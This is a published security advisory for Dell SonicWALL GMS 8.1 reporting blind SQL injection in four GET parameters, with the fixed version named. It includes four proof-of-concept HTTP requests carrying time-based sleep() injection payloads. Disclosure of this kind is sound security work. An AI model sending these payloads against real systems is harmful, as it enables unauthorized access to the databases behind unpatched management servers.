@@ -1,0 +1,112 @@
+﻿
+Dell SonicWALL Global Management System GMS 8.1 Blind SQL Injection
+
+
+Vendor: Dell Inc.
+Product web page: https://www.sonicwall.com/products/sonicwall-gms/
+Affected version: 8.1
+                  8.0 SP1 Build 8048.1410
+                  Flow Server Virtual Appliance
+
+Fixed in: 8.2 (VR-2016-01-C0V)
+
+Summary: Provide your organization, distributed enterprise or managed
+service offering with an intuitive, powerful way to rapidly deploy and
+centrally manage SonicWall solutions, with SonicWall GMS. Get more value
+from your firewall, secure remote access, anti-spam, and backup and recovery
+solutions with enhanced network security monitoring and robust network
+security reporting. By deploying GMS in an enterprise, you can minimize
+administrative overhead by streamlining security appliance deployment
+and policy management.
+
+Desc: Dell SonicWALL GMS suffers from multiple SQL Injection vulnerabilities.
+Input passed via the GET parameters 'searchBySonicwall', 'firstChangeOrderID',
+'secondChangeOrderID' and 'coDomainID' is not properly sanitised before being
+returned to the user or used in SQL queries. This can be exploited to manipulate
+SQL queries by injecting arbitrary SQL code.
+
+Tested on: SonicWALL
+           MySQL/5.0.96-community-nt
+           Apache-Coyote/1.1
+           Apache Tomcat 6.0.41
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5388
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5388.php
+
+Vendor: https://support.sonicwall.com/product-notification/215257?productName=SonicWALL%20GMS
+
+
+26.01.2016
+
+--
+
+
+Blind SQL Injection via several parameters:
+
+- searchBySonicwall (GET)
+- coDomainID (GET)
+- firstChangeOrderID (GET)
+- secondChangeOrderID (GET)
+
+
+PoC:
+
+#1
+
+GET /sgms/TaskViewServlet?page=taskView&level=1&node_id=null&screenid=15200&unused=&help_url=&node_name=null&unitType=0&searchBySonicwall=null'%2b(select*from(select(sleep(6)))a)%2b' HTTP/1.1
+Host: 127.0.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36
+Referer: http://127.0.0.1/sgms/content.jsp
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: en-US,en;q=0.8
+Cookie: JSESSIONID=DF100D251227D2BCF4DE79779C0B57E3; JSESSIONID=36E7B71D9E7367E56E005E279BCBECED; SSOSESSIONID=DF100D251227D2BCF4DE79779C0B57E3
+Connection: close
+
+
+#2
+
+GET /sgms/Logs?page=logView&searchByCO=Workflow%20Change%20Order%20Example&coDomainID=DMN0000000000000000000000001'%2b(select*from(select(sleep(6)))a)%2b'&level=1&node_id=null&screenid=15150&unused=&help_url=&node_name=null&unitType=0&searchBySonicwall=null HTTP/1.1
+Host: 127.0.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36
+Referer: http://127.0.0.1/sgms/content.jsp
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: en-US,en;q=0.8
+Cookie: JSESSIONID=DF100D251227D2BCF4DE79779C0B57E3; JSESSIONID=36E7B71D9E7367E56E005E279BCBECED; SSOSESSIONID=DF100D251227D2BCF4DE79779C0B57E3
+Connection: close
+
+
+#3
+
+GET /sgms/workflow?page=fetchCompareScreens&firstChangeOrderID=CHO14532479280350040102377D2'%2b(select*from(select(sleep(6)))a)%2b'&secondChangeOrderID=CHO14520472477130040102377D2&_dc=1453805798333&node=root HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36
+X-Requested-With: XMLHttpRequest
+Accept: */*
+Referer: http://127.0.0.1/sgms/viewdiff.jsp
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: en-US,en;q=0.8
+Cookie: JSESSIONID=DF100D251227D2BCF4DE79779C0B57E3; JSESSIONID=36E7B71D9E7367E56E005E279BCBECED; SSOSESSIONID=DF100D251227D2BCF4DE79779C0B57E3
+Connection: close
+
+
+#4
+
+GET /sgms/workflow?page=fetchCompareScreens&firstChangeOrderID=CHO14532479280350040102377D2&secondChangeOrderID=CHO14520472477130040102377D2'%2b(select*from(select(sleep(6)))a)%2b'&_dc=1453805798333&node=root HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36
+X-Requested-With: XMLHttpRequest
+Accept: */*
+Referer: http://127.0.0.1/sgms/viewdiff.jsp
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: en-US,en;q=0.8
+Cookie: JSESSIONID=DF100D251227D2BCF4DE79779C0B57E3; JSESSIONID=36E7B71D9E7367E56E005E279BCBECED; SSOSESSIONID=DF100D251227D2BCF4DE79779C0B57E3
+Connection: close
